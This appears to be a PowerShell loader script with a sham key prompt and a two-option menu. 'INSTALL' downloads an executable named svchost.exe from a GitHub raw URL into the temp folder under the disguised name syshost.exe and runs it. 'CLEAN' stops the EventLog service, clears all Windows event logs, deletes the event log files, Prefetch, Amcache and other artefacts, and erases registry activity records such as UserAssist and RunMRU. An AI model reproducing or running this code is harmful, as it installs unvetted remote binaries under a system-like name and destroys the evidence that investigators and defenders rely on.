$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "JETT.EXE ON TOP"

# =========================
# HEADER
# =========================

function Show-Header {

    Clear-Host


    Write-Host ""
    Write-Host "              SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " -ForegroundColor White
    Write-Host "                 TEST POWERSHELL " -ForegroundColor DarkGray

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""

}



function Write-Console {

    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "NO KEY" {
            Write-Host "  [-] " -NoNewline -ForegroundColor Red
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}



Show-Header

Write-Host ""
Write-Host "              E N T E R  K E Y" -ForegroundColor White
Write-Host ""

Write-Host "  [>] " -NoNewline -ForegroundColor Magenta

$key = $Host.UI.ReadLine()



if ([string]::IsNullOrWhiteSpace($key))
{
    Write-Host ""

    Write-Console "NO KEY" "NO KEY"

    Start-Sleep 2
    exit
}

Write-Host ""

Write-Console "SUCCESS" "SUCCESS"

Start-Sleep 1



while ($true)
{
    Show-Header

    Write-Console "1. INSTALL" "INFO"
    Write-Console "2. CLEAN" "INFO"
    Write-Console "0. EXIT" "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()



    if ($choice -eq "1")
    {
        Clear-Host
        Show-Header

        Write-Console "DOWNLOADING..." "INFO"

        $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
        $path = "$env:TEMP\syshost.exe"

        try {

            Invoke-WebRequest `
            -Uri $url `
            -OutFile $path `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"

            if (Test-Path $path)
            {
                Write-Host ""

                Write-Console "INSTALL SUCCESS" "SUCCESS"

                Start-Sleep 1

                Start-Process $path
            }
            else
            {
                Write-Host ""

                Write-Console "INSTALL FAILED" "NO KEY"
            }
        }
        catch {

            Write-Host ""

            Write-Console "INSTALL FAILED" "NO KEY"
        }

        Write-Host ""
        Pause
    }



  elseif ($choice -eq "2")
{
    Clear-Host
    Show-Header

    Write-Console "CLEANING SYSTEM & FORENSICS TRACES..." "INFO"

    # ==========================================
    # 1. หยุด Process และลบไฟล์เป้าหมายเดิม
    # ==========================================
    Stop-Process -Name "syshost" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\syshost.exe" -Force -ErrorAction SilentlyContinue

    # ==========================================
    # 2. เปิดไฟล์ PowerShell History ด้วย Notepad เพื่อให้ลบเอง
    # ==========================================
    $HistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path $HistoryPath) {
        Write-Console "Opening PowerShell History in Notepad for manual cleaning..." "INFO"
        # สั่งเปิด Notepad ขึ้นมาแสดงไฟล์ประวัติทันที และรอให้จัดการเสร็จค่อยไปขั้นตอนต่อไป
        Start-Process "notepad.exe" -ArgumentList $HistoryPath -Wait
        Write-Console "PowerShell History handled." "SUCCES"
    } else {
        Write-Console "PowerShell History file not found." "INFO"
    }

    # ==========================================
    # 3. ลบไฟล์ระบบ / Logs / Cache / Traces ต่างๆ
    # ==========================================
    Write-Console "Cleaning System Files & Caches..." "INFO"

    # หยุด Service ที่ล็อกไฟล์ไว้ชั่วคราว เพื่อให้ระบบสามารถลบไฟล์ได้
    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue 
    Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue

    # รายการโฟลเดอร์และไฟล์ขยะ/ร่องรอยในระบบ
    $TargetPaths = @(
        "$env:TEMP\*",
        "$env:SystemRoot\Temp\*",
        "$env:SystemRoot\Prefetch\*",
        "$env:SystemRoot\AppCompat\Programs\Amcache.hve*",
        "$env:SystemRoot\Minidump\*",
        "$env:SystemRoot\CrashDumps\*",
        "$env:LocalAppData\IconCache.db",
        "$env:LocalAppData\Microsoft\Windows\Explorer\thumbcache_*.db",
        "$env:ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb", 
        "$env:SystemRoot\inf\setupapi.dev.log",
        "$env:SystemRoot\inf\setupapi.app.log",
        "$env:ProgramData\Microsoft\Windows\WER\*",
        "$env:SystemRoot\Logs\CBS\*",
        "$env:SystemRoot\Logs\DISM\*",
        "$env:SystemRoot\DeliveryOptimization\Cache\*",
        "$env:SystemRoot\WLANReport\*"
    )

    foreach ($Path in $TargetPaths) {
        Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
    }

    # ==========================================
    # 4. ลบ Event Logs ทั้งหมดในระบบ
    # ==========================================
    Write-Console "Clearing All Windows Event Logs..." "INFO"
    
    # ลบผ่านคำสั่ง wevtutil (วิธีมาตรฐาน)
    Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
        wevtutil cl $_.LogName 2>$null
    }

    # ลบไฟล์ .evtx โดยตรงในโฟลเดอร์ Logs
    $EvtxPath = "$env:SystemRoot\System32\Winevt\Logs\*"
    Remove-Item -Path $EvtxPath -Force -ErrorAction SilentlyContinue

    # ==========================================
    # 5. ลบประวัติกิจกรรมผู้ใช้ใน Registry
    # ==========================================
    Write-Console "Cleaning Registry Activity Traces..." "INFO"

    $RegistryKeys = @(
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"
    )

    foreach ($Key in $RegistryKeys) {
        if (Test-Path $Key) {
            Remove-Item -Path $Key -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ==========================================
    # 6. คืนค่าระบบ (เปิด Service กลับมาทำงานปกติ)
    # ==========================================
    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
    Start-Service -Name "EventLog" -ErrorAction SilentlyContinue

    Write-Host ""
    Write-Console "CLEAN ALL TRACES SUCCESS" "SUCCES"
    Write-Host ""
    Pause
}



    elseif ($choice -eq "0")
    {
        exit
    }
}
